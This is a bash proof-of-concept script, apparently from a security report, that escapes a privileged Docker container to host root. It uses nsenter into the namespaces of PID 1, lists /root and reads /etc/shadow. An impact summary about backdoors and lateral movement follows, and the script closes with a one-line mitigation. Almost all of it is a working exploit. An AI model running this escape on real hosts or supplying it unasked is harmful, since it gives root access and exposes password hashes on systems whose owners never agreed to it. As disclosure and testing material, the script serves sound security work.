#!/bin/bash
# Proof of Concept: Container Escape to Root via Privileged Container
# Severity: CRITICAL (CVSS 9.3)
# Description: Demonstrates privilege escalation from container to host root

echo "=================================================================="
echo "PoC: Privilege Escalation - Container Escape to Host Root"
echo "=================================================================="
echo ""

echo "[*] WARNING: This is a CRITICAL vulnerability demonstration"
echo "[*] Shows privilege escalation from container to host root"
echo ""

echo "=================================================================="
echo "Test 1: Container Escape Using Privileged + nsenter"
echo "=================================================================="
echo ""

echo "[+] Creating privileged container and escaping to host..."
docker run --rm --privileged alpine sh -c '
  echo "[*] Inside privileged container..."
  echo "[*] Current user: $(whoami)"
  echo ""
  
  echo "[+] Using nsenter to break into host PID namespace..."
  nsenter --target 1 --mount --uts --ipc --net --pid -- sh -c "
    echo \"\"
    echo \"[!] SUCCESSFULLY ESCAPED TO HOST!\"
    echo \"[!] Current user: \$(whoami)\"
    echo \"[!] Hostname: \$(hostname)\"
    echo \"\"
    
    echo \"[+] Proof - Can access host root directory:\"
    ls -la /root 2>/dev/null | head -10
    echo \"\"
    
    echo \"[+] Proof - Can read /etc/shadow:\"
    head -3 /etc/shadow 2>/dev/null
    echo \"\"
    
    echo \"[!] This proves COMPLETE HOST COMPROMISE as root\"
  "
'

echo ""
echo "=================================================================="
echo "Impact Assessment"
echo "=================================================================="
echo ""
echo "✓ Privilege Escalation: Gained root access on host"
echo "✓ Isolation Broken: Escaped container completely"
echo "✓ Full System Control: Can read/write any file"
echo "✓ Persistence Possible: Can install backdoors"
echo "✓ Lateral Movement: Can access other containers"
echo ""
echo "Severity: CRITICAL (CVSS 9.3)"
echo "Mitigation: Block --privileged flag on containers"
echo ""
